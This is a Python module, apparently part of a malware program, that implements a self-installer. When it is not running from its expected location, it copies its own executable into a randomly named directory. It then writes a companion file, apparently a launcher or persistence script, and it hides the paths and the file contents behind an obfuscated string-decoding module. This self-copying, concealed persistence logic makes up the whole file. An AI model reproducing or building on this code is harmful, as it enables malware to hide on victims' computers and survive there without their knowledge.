# coding:utf-8
import sys
import os
from shutil import copyfile
import StringEncode, ComMod
import string
import random


class installer:
    def __init__(self):
        if self.check_runing_status() == False:
            ComMod.Log('Installer：检测到非安装路径运行')
            self.do_install()
            self.status = False
        else:
            self.install_path = sys.argv[0].replace(StringEncode.get('2'),'')
            self.status = True

    def check_runing_status(self):
        return StringEncode.get('1') in sys.argv[0]

    def do_install(self):
        try:
            ComMod.Log('Installer：开始安装')
            self.install_dir_name = StringEncode.get('1') + ''.join(
                random.sample(string.ascii_letters + string.digits, 8))
            if os.path.exists(self.install_dir_name) == False:
                os.makedirs(self.install_dir_name)
            ComMod.Log('Installer：安装目录:' + self.install_dir_name)
            self.install_path = self.install_dir_name + '\\' + ''.join(
                random.sample(string.ascii_letters + string.digits, 8))
            ComMod.Log('Installer：安装路径:' + self.install_path)
            copyfile(sys.argv[0], self.install_path + StringEncode.get('2'))
            with open(self.install_path + StringEncode.get('4'), 'w') as f:
                f.write(StringEncode.get('3').format(self.install_path + StringEncode.get('2')))
            ComMod.Log('Installer：安装完毕')
        except Exception as e:
            ComMod.Log('Installer：安装异常:' + str(e))
